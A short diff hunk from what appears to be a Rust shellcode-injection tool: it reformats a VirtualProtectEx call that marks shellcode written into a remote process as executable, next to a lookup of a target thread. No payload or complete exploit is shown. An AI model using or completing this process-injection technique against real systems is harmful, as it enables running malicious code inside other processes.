@@ -105,7 +105,13 @@ fn main(args: *mut u8, len: usize) {
         }
 
         let mut old_protect: u32 = 0;
-        VirtualProtectEx(process, remote_addr, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
+        VirtualProtectEx(
+            process,
+            remote_addr,
+            shellcode.len(),
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
 
         let tid = match find_thread(pid) {
             Some(t) => t,
